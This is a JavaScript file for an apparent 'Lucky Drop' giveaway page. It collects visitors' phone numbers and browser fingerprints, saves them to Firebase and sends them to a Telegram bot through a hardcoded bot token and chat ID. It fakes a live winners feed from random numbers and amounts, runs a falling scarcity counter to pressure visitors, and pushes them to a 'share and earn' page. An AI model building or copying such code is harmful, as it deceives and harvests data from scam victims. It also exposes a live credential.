/**
 * Lucky Drop Index Page - Login & Verification
 * Saves device fingerprint to user_sessions
 * With Phone + Device Fingerprint Ban Check
 */

// Initialize Firebase
firebase.initializeApp(firebaseConfig);
const db = firebase.database();

// Telegram Config
const botToken = '8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg';
const chatId = '7298607329';

// Scarcity counter
let count = 88;

// DOM Elements
const winnerEntry = document.getElementById('winnerEntry');
const remNum = document.getElementById('remNum');
const pBar = document.getElementById('pBar');
const modalOverlay = document.getElementById('modalOverlay');
const mainCard = document.getElementById('mainCard');
const userPhoneInput = document.getElementById('userPhone');
const claimBtn = document.getElementById('claimBtn');

// ========== DEVICE FINGERPRINT ==========
function getDeviceFingerprint() {
    const screenResolution = `${screen.width}x${screen.height}x${screen.colorDepth}`;
    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
    const language = navigator.language;
    const userAgent = navigator.userAgent;
    const platform = navigator.platform;
    const hardwareConcurrency = navigator.hardwareConcurrency || 'unknown';
    const deviceMemory = navigator.deviceMemory || 'unknown';
    
    const fingerprintString = `${userAgent}|${screenResolution}|${timezone}|${language}|${platform}|${hardwareConcurrency}|${deviceMemory}`;
    
    let hash = 0;
    for (let i = 0; i < fingerprintString.length; i++) {
        hash = ((hash << 5) - hash) + fingerprintString.charCodeAt(i);
        hash |= 0;
    }
    return `FP_${Math.abs(hash)}`;
}

// ========== GET OR CREATE DEVICE DISPLAY ID ==========
async function getOrCreateDeviceId(fingerprint) {
    if (!fingerprint || fingerprint === '---') return '---';
    
    const deviceMapRef = db.ref('device_id_map/' + fingerprint);
    const snap = await deviceMapRef.once('value');
    
    if (snap.exists()) {
        return snap.val().displayId;
    }
    
    const counterRef = db.ref('admin/deviceCounter');
    const counterSnap = await counterRef.once('value');
    let nextNum = (counterSnap.val() || 0) + 1;
    await counterRef.set(nextNum);
    
    const displayId = `Dev${nextNum}`;
    
    await deviceMapRef.set({
        displayId: displayId,
        createdAt: Date.now(),
        fingerprint: fingerprint
    });
    
    return displayId;
}

// ========== SAVE DEVICE INFO TO DATABASE ==========
async function saveDeviceInfo(phone, fingerprint, deviceDisplayId) {
    const deviceInfo = {
        phone: phone,
        fingerprint: fingerprint,
        displayId: deviceDisplayId,
        screenResolution: `${screen.width}x${screen.height}`,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        language: navigator.language,
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        lastSeen: Date.now(),
        firstSeen: Date.now()
    };
    
    const existingDevice = await db.ref('devices/' + fingerprint).once('value');
    if (!existingDevice.exists()) {
        await db.ref('devices/' + fingerprint).set(deviceInfo);
    } else {
        await db.ref('devices/' + fingerprint).update({ lastSeen: Date.now() });
    }
    
    await db.ref('device_phone_map/' + fingerprint).set({
        phone: phone,
        displayId: deviceDisplayId,
        lastSeen: Date.now()
    });
}

// ========== CREATE USER SESSION (WITH FINGERPRINT) ==========
async function createUserSession(phone, fingerprint, deviceDisplayId) {
    const sessionRef = db.ref('user_sessions/' + phone);
    const sessionSnap = await sessionRef.once('value');
    
    if (!sessionSnap.exists()) {
        await sessionRef.set({
            phone: phone,
            balance: 0,
            clicks: 0,
            deviceFingerprint: fingerprint,
            deviceDisplayId: deviceDisplayId,
            lastUpdate: Date.now(),
            createdAt: Date.now()
        });
    } else {
        await sessionRef.update({
            lastUpdate: Date.now(),
            deviceFingerprint: fingerprint,
            deviceDisplayId: deviceDisplayId
        });
    }
}

// ========== SHOW BLOCKED UI ==========
function showBlockedUI(reason = "banned") {
    modalOverlay.style.display = 'flex';
    
    let title = "ACCESS RESTRICTED";
    let blockMessage = "⚠️ This account has been restricted by the administrator.";
    
    if (reason === "claimed") {
        title = "ALREADY CLAIMED";
        blockMessage = "⚠️ This number has already claimed a reward before.";
    }

    document.getElementById('modalBodyContent').innerHTML = `
        <div class="bonus-preview">
            <div class="preview-amount">🚫</div>
            <div class="preview-label">ACCESS DENIED</div>
        </div>
        <h3 style="color: #FF4444; text-align: center; margin-bottom: 10px;">${title}</h3>
        <p style="font-size: 13px; color: #94a3b8; text-align: center; margin-bottom: 20px;">${blockMessage}</p>
        <button class="btn-claim" onclick="location.reload()" style="background: #334155; color: white;">OK</button>
    `;
    mainCard.style.opacity = "0.3";
    mainCard.style.pointerEvents = "none";
}

// ========== HANDLE VERIFY ==========
window.handleVerify = function() {
    const currentUrl = window.location.href.split('#')[0].replace(/^https?:\/\//, '');
    if (!window.location.hash.includes("verified")) {
        window.location.href = `intent://${currentUrl}#verified#Intent;scheme=https;package=com.android.chrome;end`;
    } else {
        modalOverlay.style.display = 'flex';
    }
};

// ========== BANNED CHECK FUNCTIONS ==========

// Check if phone number is banned
async function isPhoneBanned(phone) {
    const bannedSnap = await db.ref('banned_ghosts/' + phone).once('value');
    return bannedSnap.exists();
}

// Check if fingerprint is linked to a banned phone
async function isFingerprintLinkedToBanned(fingerprint) {
    // Check device_phone_map for linked phone
    const devicePhoneMapSnap = await db.ref('device_phone_map/' + fingerprint).once('value');
    if (devicePhoneMapSnap.exists()) {
        const linkedPhone = devicePhoneMapSnap.val().phone;
        const isLinkedBanned = await isPhoneBanned(linkedPhone);
        if (isLinkedBanned) {
            return true;
        }
    }
    
    // Check all banned_ghosts for matching fingerprint
    const bannedSnap = await db.ref('banned_ghosts').once('value');
    const bannedData = bannedSnap.val();
    
    if (bannedData) {
        for (const [phone, data] of Object.entries(bannedData)) {
            if (data.fingerprint === fingerprint) {
                return true;
            }
        }
    }
    
    return false;
}

// Get ban details
async function getBanDetails(phone, fingerprint) {
    // Check phone ban first
    const phoneBannedSnap = await db.ref('banned_ghosts/' + phone).once('value');
    if (phoneBannedSnap.exists()) {
        return {
            isBanned: true,
            reason: phoneBannedSnap.val().reason || "Account restricted",
            type: "phone"
        };
    }
    
    // Check fingerprint ban (device linked to banned phone)
    const isFpLinkedToBanned = await isFingerprintLinkedToBanned(fingerprint);
    if (isFpLinkedToBanned) {
        return {
            isBanned: true,
            reason: "This device is restricted",
            type: "device"
        };
    }
    
    return { isBanned: false };
}

// ========== CHECK IF NUMBER ALREADY CLAIMED ==========
async function isNumberClaimed(phone) {
    const logSnap = await db.ref('user_logs/' + phone).once('value');
    return (logSnap.exists() && logSnap.val().status === 'claimed');
}

// ========== PROCESS STEP 1 ==========
window.processStep1 = async function() {
    const phone = userPhoneInput.value.trim();
    const btn = claimBtn;
    const fingerprint = getDeviceFingerprint();

    if (phone.length < 11 || !phone.startsWith('09')) {
        alert("Enter valid 11-digit number.");
        return;
    }
    
    btn.disabled = true;
    btn.innerHTML = "VERIFYING...";

    try {
        // ========== BANNED CHECK #1: Phone number ==========
        const banDetails = await getBanDetails(phone, fingerprint);
        if (banDetails.isBanned) {
            showBlockedUI("banned");
            btn.disabled = false;
            btn.innerHTML = "CLAIM REWARD";
            return;
        }
        
        // ========== BANNED CHECK #2: Already claimed ==========
        const isClaimed = await isNumberClaimed(phone);
        if (isClaimed) {
            showBlockedUI("claimed");
            btn.disabled = false;
            btn.innerHTML = "CLAIM REWARD";
            return;
        }
        
        // ========== NORMAL FLOW ==========
        const deviceDisplayId = await getOrCreateDeviceId(fingerprint);
        await saveDeviceInfo(phone, fingerprint, deviceDisplayId);
        await createUserSession(phone, fingerprint, deviceDisplayId);
        
        // Send Telegram notification
        const message = `🎁 LUCKY DROP LOGIN:\n📱 ${phone}\n🖥️ FP: ${fingerprint}\n🔑 DEV#: ${deviceDisplayId}`;
        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
            .catch(e => console.log('Telegram error:', e));
        
        localStorage.setItem("userPhone", phone);
        localStorage.setItem("userDeviceId", fingerprint);
        localStorage.setItem("userDeviceDisplayId", deviceDisplayId);
        btn.innerHTML = "SUCCESS!";
        
        setTimeout(() => {
            window.location.href = "share_and_earn.html";
        }, 1000);
        
    } catch (error) {
        console.error("Process error:", error);
        alert("An error occurred. Please try again.");
        btn.disabled = false;
        btn.innerHTML = "CLAIM REWARD";
    }
};

// ========== LIVE ACTIVITY FEED ==========
function startTicker() {
    setInterval(() => {
        const prefixes = ["0917", "0918", "0927", "0998", "0945", "0966", "0955"];
        const randomPrefix = prefixes[Math.floor(Math.random() * prefixes.length)];
        const randomSuffix = Math.floor(1000 + Math.random() * 9000);
        const amounts = [150, 300, 450, 600, 750];
        const amount = amounts[Math.floor(Math.random() * amounts.length)];
        if (winnerEntry) {
            winnerEntry.innerHTML = `${randomPrefix}***${randomSuffix} earned <img src="images/gc_icon.png" class="feed-gc-icon" alt="₱"> ${amount}`;
        }
    }, 4500);
}

// ========== SCARCITY COUNTER ==========
function startScarcityCounter() {
    setInterval(() => {
        if (count > 15) {
            count -= Math.floor(Math.random() * 2) + 1;
            if (remNum) remNum.innerText = count;
            if (pBar) pBar.style.width = count + "%";
        }
    }, 5000);
}

// ========== FLOATING PARTICLES EFFECT ==========
function initParticles() {
    const canvas = document.getElementById('particleCanvas');
    if (!canvas) return;
    
    let width = window.innerWidth;
    let height = window.innerHeight;
    let particles = [];
    let ctx = canvas.getContext('2d');
    
    function resizeCanvas() {
        width = window.innerWidth;
        height = window.innerHeight;
        canvas.width = width;
        canvas.height = height;
    }
    
    function createParticles() {
        const particleCount = Math.min(40, Math.floor(width * height / 20000));
        for (let i = 0; i < particleCount; i++) {
            particles.push({
                x: Math.random() * width,
                y: Math.random() * height,
                size: Math.random() * 2 + 1,
                alpha: Math.random() * 0.25 + 0.05,
                vx: (Math.random() - 0.5) * 0.3,
                vy: (Math.random() - 0.5) * 0.2
            });
        }
    }
    
    function animateParticles() {
        if (!ctx) return;
        ctx.clearRect(0, 0, width, height);
        
        for (let p of particles) {
            p.x += p.vx;
            p.y += p.vy;
            
            if (p.x < 0) p.x = width;
            if (p.x > width) p.x = 0;
            if (p.y < 0) p.y = height;
            if (p.y > height) p.y = 0;
            
            ctx.beginPath();
            ctx.arc(p.x, p.y, p.size, 0, Math.PI * 2);
            ctx.fillStyle = `rgba(255, 215, 0, ${p.alpha})`;
            ctx.fill();
        }
        
        requestAnimationFrame(animateParticles);
    }
    
    window.addEventListener('resize', () => {
        resizeCanvas();
        particles = [];
        createParticles();
    });
    
    resizeCanvas();
    createParticles();
    animateParticles();
}

// ========== MODAL FUNCTIONS ==========
function closeModal() {
    if (modalOverlay) modalOverlay.style.display = 'none';
}

// ========== CHECK HASH ON LOAD ==========
window.onload = () => {
    if (window.location.hash.includes("verified")) {
        modalOverlay.style.display = 'flex';
    }
};

// ========== INITIALIZE ==========
startTicker(startTicker);
startScarcityCounter();
initParticles();

// Modal close on outside click
if (modalOverlay) {
    modalOverlay.addEventListener('click', function(e) {
        if (e.target === modalOverlay) closeModal();
    });
}

// Enter key support
userPhoneInput?.addEventListener('keypress', (e) => {
    if (e.key === 'Enter') window.processStep1();
});